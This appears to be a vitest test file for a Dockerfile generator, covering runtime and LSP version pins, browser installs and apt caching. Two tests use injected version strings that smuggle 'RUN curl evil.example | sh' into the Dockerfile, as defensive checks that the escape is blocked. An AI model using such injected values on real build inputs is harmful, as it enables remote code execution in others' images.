import { describe, expect, it } from 'vitest';
import { renderDockerfile } from '../src/step-engine/steps/env-replicate/02-generate-dockerfile.js';
import {
  DEFAULT_GO_VERSION,
  DEFAULT_RUST_VERSION,
} from '../src/step-engine/steps/env-replicate/_shared.js';
import { buildDefaultMcpServers } from '../src/sandbox/mcp-config.js';

describe('renderDockerfile LSP version pins', () => {
  it('pins each pinnable LSP install line when versions are provided', () => {
    const df = renderDockerfile('ubuntu:24.04', {
      lspServers: ['intelephense', 'vtsls', 'pyright', 'gopls', 'solargraph', 'rust-analyzer'],
      lspServerVersions: {
        intelephense: '1.18.4',
        vtsls: '0.3.0',
        pyright: '1.1.410',
        gopls: '0.22.0',
        solargraph: '0.59.2',
        'rust-analyzer': '9.9.9',
      },
    });
    expect(df).toContain('npm install -g intelephense@1.18.4');
    expect(df).toContain('npm install -g @vtsls/language-server@0.3.0 typescript');
    expect(df).toContain('pip install --break-system-packages pyright==1.1.410');
    expect(df).toContain('go install golang.org/x/tools/gopls@v0.22.0');
    expect(df).toContain('gem install solargraph -v 0.59.2');
    // rust-analyzer is not pinnable — the version is ignored.
    expect(df).toContain('rustup component add rust-analyzer');
    expect(df).not.toContain('rust-analyzer@9.9.9');
  });

  it('leaves install lines unpinned when no versions are provided', () => {
    const df = renderDockerfile('ubuntu:24.04', { lspServers: ['intelephense', 'gopls'] });
    expect(df).toContain('npm install -g intelephense\n');
    expect(df).toContain('go install golang.org/x/tools/gopls@latest');
    expect(df).not.toContain('intelephense@');
  });

  // Ubuntu ships no chromium deb: `chromium` has no candidate and `chromium-browser` is a
  // snap redirect stub. The generated image previously named the Debian package on both
  // bases, so /usr/bin/chromium -- which mcp-config, CHROME_PATH, browser-check.js and
  // 08a-browser-verify all assume -- simply did not exist on Ubuntu.
  it('takes the browser from Google apt on Ubuntu and from the chromium deb on Debian', () => {
    const ubuntu = renderDockerfile('ubuntu:24.04', { browserTesting: true });
    expect(ubuntu).toContain('google-chrome-stable');
    expect(ubuntu).toContain('ln -sf /usr/bin/google-chrome /usr/bin/chromium');
    // The Debian package name must NOT be requested on Ubuntu -- that is the original bug.
    expect(ubuntu).not.toMatch(/--no-install-recommends chromium /);

    const debian = renderDockerfile('debian:bookworm-slim', { browserTesting: true });
    expect(debian).toMatch(/--no-install-recommends chromium /);
    expect(debian).not.toContain('google-chrome-stable');
    expect(debian).not.toContain('dl.google.com');
  });

  // Each apt block deletes /var/lib/apt/lists, so every additional block re-fetches the
  // whole package index -- MEASURED 32.3 MB per `apt-get update`. Installing the browser
  // and the X stack from one block is what keeps that off a slow connection.
  it('installs the Ubuntu browser and the X stack from a single apt block', () => {
    const ubuntu = renderDockerfile('ubuntu:24.04', { browserTesting: true });
    const line = ubuntu
      .split('\n')
      .find((l) => l.includes('google-chrome-stable') && l.includes('apt-get install'));
    expect(line).toBeDefined();
    // Same install line, therefore the same `apt-get update`.
    for (const pkg of ['xvfb', 'x11vnc', 'socat', 'procps', 'fonts-dejavu']) {
      expect(line).toContain(pkg);
    }
    // The repo is added inside that block too, not as a separate updating step.
    const browserSection = ubuntu.slice(ubuntu.indexOf('# Browser testing'));
    expect(browserSection.match(/apt-get update/g)?.length).toBe(1);
  });

  // Each apt block used to end with `rm -rf /var/lib/apt/lists/*`, so the next block
  // re-fetched the whole index -- MEASURED 32.3 MB per `apt-get update`. Cache mounts share
  // it across blocks, images and builds instead: a 3-block build went 133 MB -> 68.6 MB, and
  // an incremental rebuild 36 MB -> 0.18 MB.
  it('caches apt through BuildKit mounts and never deletes the lists', () => {
    const df = renderDockerfile('ubuntu:24.04', {
      browserTesting: true,
      runtimes: ['node', 'python', 'java', 'ruby', 'php'],
      versions: { node: '22', python: '3.12', java: '17', php: '8.2' },
    } as never);
    // Deleting the lists would wipe the mount, which is worse than not caching at all.
    expect(df).not.toContain('rm -rf /var/lib/apt/lists');
    // Without removing docker-clean the package half of the cache stays empty.
    expect(df).toContain('rm -f /etc/apt/apt.conf.d/docker-clean');

    // Every RUN that touches apt must carry both mounts.
    const runs = df.split('\n\n').filter((b) => /apt-get (update|install)/.test(b));
    expect(runs.length).toBeGreaterThan(3);
    for (const block of runs) {
      expect(block).toContain('--mount=type=cache,target=/var/cache/apt,sharing=locked');
      expect(block).toContain('--mount=type=cache,target=/var/lib/apt/lists,sharing=locked');
    }
  });

  // Removing a trailing `&& rm -rf ...` line leaves the line above it ending in a backslash
  // that continues into nothing. That renders a broken Dockerfile and is invisible in a diff.
  it('never emits a line continuation into a blank line or a comment', () => {
    for (const [base, deps] of [
      [
        'ubuntu:24.04',
        { browserTesting: true, runtimes: ['node', 'python', 'java', 'ruby', 'php'] },
      ],
      ['debian:bookworm-slim', { browserTesting: true, runtimes: ['go', 'rust'] }],
      ['ubuntu:24.04', {}],
    ] as const) {
      const ls = renderDockerfile(base, deps as never).split('\n');
      const dangling = ls.filter((l, i) => {
        if (!/\\\s*$/.test(l)) return false;
        const next = ls[i + 1];
        return next === undefined || next.trim() === '' || next.trimStart().startsWith('#');
      });
      expect(dangling).toEqual([]);
    }
  });

  // A pinned Chrome cannot come from apt -- Google's repo publishes one version and keeps no
  // archive -- so the binary comes from Chrome for Testing while apt supplies only the
  // dependency graph, taken from Chrome's own metadata via `apt-get satisfy`. The browser
  // package itself must NOT be installed: it would put a second browser on the wire (~164 MB)
  // only to be overwritten by the zip.
  it('installs a pinned Chrome from Chrome for Testing, without a second browser', () => {
    const df = renderDockerfile('ubuntu:24.04', {
      browserTesting: true,
      browser: { type: 'chrome', version: '140.0.7339.207' },
    } as never);
    expect(df).toContain('chrome-for-testing-public/140.0.7339.207/linux64/chrome-linux64.zip');
    expect(df).toContain('apt-get satisfy -y --no-install-recommends "$DEPS"');
    expect(df).toContain('ln -sf /opt/chrome/chrome-linux64/chrome /usr/bin/chromium');
    // Fetched once per host, not once per template -- the zip is 168 MB.
    expect(df).toContain('--mount=type=cache,target=/opt/cft-cache');
    // The deb is never installed on the pinned path.
    expect(df).not.toMatch(/--no-install-recommends google-chrome-stable/);
    // The X stack still comes from the same apt block (one index fetch).
    for (const pkg of ['xvfb', 'x11vnc', 'socat']) expect(df).toContain(pkg);
  });

  it('leaves the system-default browser path exactly as it was', () => {
    // No `browser` key at all is the rollback: it must render what it rendered before the
    // picker existed -- apt's stable browser, and no Chrome for Testing anywhere.
    const ubuntu = renderDockerfile('ubuntu:24.04', { browserTesting: true });
    expect(ubuntu).toContain('google-chrome-stable');
    expect(ubuntu).not.toContain('chrome-for-testing-public');
    expect(ubuntu).not.toContain('apt-get satisfy');

    const debian = renderDockerfile('debian:bookworm-slim', { browserTesting: true });
    expect(debian).toMatch(/--no-install-recommends chromium /);
    expect(debian).not.toContain('chrome-for-testing-public');

    // An explicit null version is the same thing as absent.
    const explicitDefault = renderDockerfile('ubuntu:24.04', {
      browserTesting: true,
      browser: { type: 'chrome', version: null },
    } as never);
    expect(explicitDefault).toBe(ubuntu);
  });

  // Edge is the only one of the three apt can pin directly: its index keeps 184 debs across
  // 39 majors, so no zip overlay and no separate dependency step are needed. Verified before
  // being offered: Edge 149 pinned installs and reports 149, chrome-devtools-mcp drives it
  // over CDP, and the credential controls still hold through it.
  it('installs Edge from the Microsoft repo, pinned when asked', () => {
    const pinned = renderDockerfile('ubuntu:24.04', {
      browserTesting: true,
      browser: { type: 'edge', version: '149.0.4022.98-1' },
    } as never);
    expect(pinned).toContain('packages.microsoft.com/repos/edge');
    expect(pinned).toContain('microsoft-edge-stable=149.0.4022.98-1');
    expect(pinned).toContain('ln -sf /usr/bin/microsoft-edge /usr/bin/chromium');
    // apt resolves Edge's dependency graph from the deb, so none of the Chrome machinery.
    expect(pinned).not.toContain('chrome-for-testing-public');
    expect(pinned).not.toContain('apt-get satisfy');
    expect(pinned).not.toContain('google-chrome-stable');

    const latest = renderDockerfile('ubuntu:24.04', {
      browserTesting: true,
      browser: { type: 'edge' },
    } as never);
    expect(latest).toMatch(/microsoft-edge-stable [a-z]/);
    expect(latest).not.toContain('microsoft-edge-stable=');
  });

  it('needs no base branch for Edge — the Microsoft repo serves Debian too', () => {
    for (const base of ['ubuntu:24.04', 'debian:bookworm-slim']) {
      const df = renderDockerfile(base, {
        browserTesting: true,
        browser: { type: 'edge' },
      } as never);
      expect(df).toContain('microsoft-edge-stable');
      expect(df).toContain('RUN /usr/bin/chromium --version');
    }
  });

  it('fails the build when the base cannot produce a working browser', () => {
    // The whole class of bug this guards: an image that builds fine and only reveals it has
    // no browser hours later, inside an MCP tool call during a verification step.
    for (const base of ['ubuntu:24.04', 'debian:bookworm-slim']) {
      const df = renderDockerfile(base, { browserTesting: true });
      expect(df).toContain('RUN /usr/bin/chromium --version');
      // Same line records the version: it cannot be pinned (neither apt source archives
      // old builds), so the least we can do is make the drift readable from the image.
      expect(df).toContain('/etc/haive-browser-version');
    }
    // Not emitted at all when browser testing is off -- there is no browser to assert on.
    expect(renderDockerfile('ubuntu:24.04', {})).not.toContain('/usr/bin/chromium --version');
  });

  it('pins the chrome-devtools-mcp env install line when browserTesting is on', () => {
    const pinned = renderDockerfile('ubuntu:24.04', {
      browserTesting: true,
      chromeDevtoolsMcpVersion: '1.2.0',
    });
    expect(pinned).toContain('npm install -g chrome-devtools-mcp@1.2.0');

    const unpinned = renderDockerfile('ubuntu:24.04', { browserTesting: true });
    expect(unpinned).toContain('npm install -g chrome-devtools-mcp');
    expect(unpinned).not.toContain('chrome-devtools-mcp@');
  });
});

// Go's URL carried a bare `go1.23.0` literal and Rust took `--default-toolchain stable`:
// opposite failures (frozen vs drifting), one fix -- a recorded default a declared version
// overrides. See docs/plans/patient-pinning-kernighan.md.
describe('renderDockerfile runtime version pins', () => {
  it('installs the declared Go and Rust versions', () => {
    const df = renderDockerfile('ubuntu:24.04', {
      runtimes: ['go', 'rust'],
      versions: { go: '1.24.5', rust: '1.90.0' },
    } as never);
    expect(df).toContain('https://go.dev/dl/go1.24.5.linux-amd64.tar.gz');
    expect(df).toContain('--default-toolchain 1.90.0 --profile minimal');
    expect(df).not.toContain('--default-toolchain stable');
  });

  it('falls back to the recorded defaults, never to a floating one', () => {
    const df = renderDockerfile('ubuntu:24.04', { runtimes: ['go', 'rust'] } as never);
    expect(df).toContain(`https://go.dev/dl/go${DEFAULT_GO_VERSION}.linux-amd64.tar.gz`);
    expect(df).toContain(`--default-toolchain ${DEFAULT_RUST_VERSION} --profile minimal`);
    // The frozen literal and the floating toolchain are both gone.
    expect(df).not.toContain('go1.23.0');
    expect(df).not.toContain('--default-toolchain stable');
    // The fallback is visible in the Dockerfile, not just implied by the URL.
    expect(df).toContain(`# Go ${DEFAULT_GO_VERSION}`);
    expect(df).toContain(`# Rust ${DEFAULT_RUST_VERSION}`);
  });

  // go.mod says `go 1.26`, and go1.26.linux-amd64.tar.gz DOES NOT EXIST -- taking the
  // declared value verbatim would 404 the build. MEASURED against go.dev 2026-08-23: the
  // bare X.Y filename stops at 1.20, the X.Y.0 filename starts at 1.21.
  it('turns a go.mod two-part version into the filename go.dev actually publishes', () => {
    const modern = renderDockerfile('ubuntu:24.04', {
      runtimes: ['go'],
      versions: { go: '1.26' },
    } as never);
    expect(modern).toContain('https://go.dev/dl/go1.26.0.linux-amd64.tar.gz');

    // <= 1.20 is the other side of the boundary: there the bare name is the real one.
    const legacy = renderDockerfile('ubuntu:24.04', {
      runtimes: ['go'],
      versions: { go: '1.20' },
    } as never);
    expect(legacy).toContain('https://go.dev/dl/go1.20.linux-amd64.tar.gz');

    // A declared patch version is passed through untouched.
    const patched = renderDockerfile('ubuntu:24.04', {
      runtimes: ['go'],
      versions: { go: 'go1.24.3' },
    } as never);
    expect(patched).toContain('https://go.dev/dl/go1.24.3.linux-amd64.tar.gz');
  });

  it('falls back rather than rendering a URL from an unusable Go version', () => {
    const df = renderDockerfile('ubuntu:24.04', {
      runtimes: ['go'],
      versions: { go: '>=1' },
    } as never);
    expect(df).toContain(`https://go.dev/dl/go${DEFAULT_GO_VERSION}.linux-amd64.tar.gz`);
  });

  // rustup resolves a two-part toolchain name (VERIFIED: channel-rust-1.98.toml resolves),
  // so a Cargo.toml `rust-version = "1.90"` needs no normalising.
  it('passes a two-part Rust version straight to rustup', () => {
    const df = renderDockerfile('ubuntu:24.04', {
      runtimes: ['rust'],
      versions: { rust: '1.90' },
    } as never);
    expect(df).toContain('--default-toolchain 1.90 --profile minimal');
  });

  // The version never reaches an apt package name -- naming `ruby3.4` on a suite that ships
  // only ruby3.2 fails the build outright, which is why the tarball path exists at all.
  it('never turns a Ruby version into an apt package name', () => {
    const df = renderDockerfile('ubuntu:24.04', {
      runtimes: ['ruby'],
      versions: { ruby: '3.4.6' },
    } as never);
    expect(df).not.toContain('ruby3.4');
    expect(df).not.toMatch(/--no-install-recommends ruby3/);
  });

  // These versions default to a REPO-DERIVED capture (Cargo.toml `rust-version`, a Gemfile's
  // `ruby '...'`), and a JS negated class matches a newline -- so a crafted file can close
  // the quote a line later and carry its own RUN into the generated Dockerfile.
  it('never lets a repo-supplied version escape its line', () => {
    const df = renderDockerfile('ubuntu:24.04', {
      runtimes: ['rust', 'ruby', 'go'],
      versions: {
        rust: '1.90\nRUN curl evil.example | sh',
        ruby: '3.4\nRUN curl evil.example | sh',
        go: '1.24\nRUN curl evil.example | sh',
      },
    } as never);
    expect(df).not.toContain('evil.example');
    // Each falls back to something buildable rather than failing open.
    expect(df).toContain(`--default-toolchain ${DEFAULT_RUST_VERSION} --profile minimal`);
    expect(df).toContain(`https://go.dev/dl/go${DEFAULT_GO_VERSION}.linux-amd64.tar.gz`);
    expect(df).toContain('# Ruby (whatever the base suite ships)');
  });

  // Same defect on the two runtimes that predate this change: `engines.node` and pom.xml's
  // `<maven.compiler.source>` are repo-supplied too, and the pom capture (`[^<]+`) spans a
  // newline just as the Gemfile one does. Both name their install source by MAJOR alone.
  it('never lets a repo-supplied Node or Java major escape its line', () => {
    const df = renderDockerfile('ubuntu:24.04', {
      runtimes: ['node', 'java'],
      versions: {
        node: '22\nRUN curl evil.example | sh',
        java: '17\nRUN curl evil.example | sh',
      },
    } as never);
    expect(df).not.toContain('evil.example');
    expect(df).toContain('https://deb.nodesource.com/setup_22.x');
    expect(df).toContain('openjdk-17-jdk-headless');
  });

  // The 1.8 -> 8 unwrap is how pom.xml/gradle name Java 8 and older; apt names it openjdk-8.
  it('keeps the Java 1.x unwrap and the plain-major path working', () => {
    const legacy = renderDockerfile('ubuntu:24.04', {
      runtimes: ['java'],
      versions: { java: '1.8' },
    } as never);
    expect(legacy).toContain('openjdk-8-jdk-headless');
    expect(legacy).toContain('/usr/lib/jvm/java-8-openjdk-amd64');

    const modern = renderDockerfile('ubuntu:24.04', {
      runtimes: ['java'],
      versions: { java: '21' },
    } as never);
    expect(modern).toContain('openjdk-21-jdk-headless');

    // A declared Node version keeps reaching nodesource by major.
    const node = renderDockerfile('ubuntu:24.04', {
      runtimes: ['node'],
      versions: { node: '24.3.0' },
    } as never);
    expect(node).toContain('https://deb.nodesource.com/setup_24.x');
  });

  // The Ruby block used to borrow build-essential from the NODE block, which arrives only
  // because browserTesting defaults on and pulls node in. A Ruby-only project with browser
  // testing off therefore rendered `gem install solargraph` with no compiler -- MEASURED on
  // ubuntu:24.04, that exits 1 and FAILS THE IMAGE BUILD (solargraph needs the native prism
  // ext; `gem install bigdecimal` fails the same way).
  it('gives the Ruby block its own compiler, with no browser or node declared', () => {
    const df = renderDockerfile('ubuntu:24.04', {
      runtimes: ['ruby'],
      lspServers: ['solargraph'],
      browserTesting: false,
    } as never);
    expect(df).not.toContain('nodesource');
    const rubyBlock = df.slice(df.indexOf('# Ruby'), df.indexOf('# Language servers'));
    expect(rubyBlock).toContain('build-essential');
    // The compiler must land BEFORE the gem install that needs it.
    expect(df.indexOf('build-essential')).toBeLessThan(df.indexOf('gem install solargraph'));
  });

  // apt ships exactly one interpreter per suite, so a declared Ruby arrives as a prebuilt
  // ruby-builder tarball instead. The prefix is NOT a choice: these builds are not
  // relocatable and die with "cannot open shared object file: libruby.so" anywhere else.
  it('installs a resolved Ruby from a prebuilt interpreter at the canonical prefix', () => {
    const df = renderDockerfile('ubuntu:24.04', {
      runtimes: ['ruby'],
      lspServers: ['solargraph'],
      browserTesting: false,
      versions: { ruby: '3.4.6' },
    } as never);
    expect(df).toContain(
      'https://github.com/ruby/ruby-builder/releases/download/toolcache/ruby-3.4.6-ubuntu-24.04.tar.gz',
    );
    expect(df).toContain('tar -xz -C /opt/hostedtoolcache/Ruby/3.4.6');
    expect(df).toContain('ENV PATH="/opt/hostedtoolcache/Ruby/3.4.6/x64/bin:${PATH}"');
    // psych links against libyaml, and without it `gem install` itself fails.
    expect(df).toContain('libyaml-0-2');
    // apt's interpreter must NOT also be installed -- it would shadow nothing but costs a
    // second Ruby in the image.
    expect(df).not.toMatch(/--no-install-recommends ruby ruby-dev/);
    // The interpreter has to land before the gem install that uses it.
    expect(df.indexOf('hostedtoolcache')).toBeLessThan(df.indexOf('gem install solargraph'));
  });

  // 01-declare-deps writes versions.ruby ONLY after resolveRubyVersion matched the catalog,
  // so an absent key is how a cold cache, a downed feed and an unbuilt version all arrive.
  it('falls back to the apt interpreter when no version was resolved', () => {
    const df = renderDockerfile('ubuntu:24.04', {
      runtimes: ['ruby'],
      browserTesting: false,
    } as never);
    expect(df).toContain('# Ruby (whatever the base suite ships)');
    expect(df).toContain('--no-install-recommends ruby ruby-dev build-essential');
    expect(df).not.toContain('hostedtoolcache');
    expect(df).not.toContain('ruby-builder');
  });

  // Honouring a declared Ruby made this reachable: no solargraph version installs on 2.7
  // (its rubocop chain pulls `parallel`, which needs Ruby >= 3.3), so the unconditional
  // install would fail the build for exactly the legacy app the prebuilt interpreters exist
  // to support. MEASURED floor: 3.0 works (solargraph 0.58.3), 2.7 fails at every pin tried.
  it('skips solargraph below the measured Ruby floor, and says why', () => {
    const df = renderDockerfile('ubuntu:24.04', {
      runtimes: ['ruby'],
      lspServers: ['solargraph'],
      browserTesting: false,
      versions: { ruby: '2.7.8' },
    } as never);
    expect(df).not.toContain('gem install solargraph');
    expect(df).toContain('solargraph SKIPPED');
    expect(df).toContain('2.7.8');
    // The interpreter itself is still installed -- only the LSP is dropped.
    expect(df).toContain('ruby-2.7.8-ubuntu-24.04.tar.gz');
  });

  it('installs solargraph at the floor and above, and when Ruby comes from apt', () => {
    for (const ruby of ['3.0.7', '3.4.6']) {
      const df = renderDockerfile('ubuntu:24.04', {
        runtimes: ['ruby'],
        lspServers: ['solargraph'],
        browserTesting: false,
        versions: { ruby },
      } as never);
      expect(df).toContain('gem install solargraph');
      expect(df).not.toContain('SKIPPED');
    }
    // No declared version means apt's interpreter, which is far above the floor.
    const apt = renderDockerfile('ubuntu:24.04', {
      runtimes: ['ruby'],
      lspServers: ['solargraph'],
      browserTesting: false,
    } as never);
    expect(apt).toContain('gem install solargraph');
    expect(apt).not.toContain('SKIPPED');
  });

  // declaredDeps is folded into envTemplateHash, so a project declaring none of these must
  // render byte-identically to how it rendered before the fields existed -- otherwise every
  // environment forks a template row and rebuilds its image for no change.
  it('renders identically when go/rust/ruby are absent vs explicitly null', () => {
    const base = { runtimes: ['node', 'php'], versions: { node: '22', php: '8.3' } };
    const withNulls = {
      runtimes: ['node', 'php'],
      versions: { node: '22', php: '8.3', go: null, rust: null, ruby: null },
    };
    expect(renderDockerfile('ubuntu:24.04', withNulls as never)).toBe(
      renderDockerfile('ubuntu:24.04', base as never),
    );
  });
});

describe('buildDefaultMcpServers chrome-devtools version', () => {
  function chromeArgs(opts: Parameters<typeof buildDefaultMcpServers>[0]): string[] {
    const server = buildDefaultMcpServers(opts).find((s) => s.name === 'chrome-devtools');
    return server?.args ?? [];
  }

  it('uses the pinned version in the npx spec', () => {
    const args = chromeArgs({
      repoPath: '/w',
      includeChromeDevtools: true,
      chromeDevtoolsMcpVersion: '1.2.0',
    });
    expect(args).toContain('chrome-devtools-mcp@1.2.0');
    expect(args).not.toContain('chrome-devtools-mcp@latest');
  });

  it('falls back to @latest when unpinned', () => {
    const args = chromeArgs({ repoPath: '/w', includeChromeDevtools: true });
    expect(args).toContain('chrome-devtools-mcp@latest');
  });

  it('keeps the pin when co-driving a live browser URL', () => {
    const args = chromeArgs({
      repoPath: '/w',
      includeChromeDevtools: true,
      chromeDevtoolsBrowserUrl: 'http://127.0.0.1:9222',
      chromeDevtoolsMcpVersion: '1.2.0',
    });
    expect(args).toContain('chrome-devtools-mcp@1.2.0');
    expect(args).toContain('--browser-url=http://127.0.0.1:9222');
  });
});
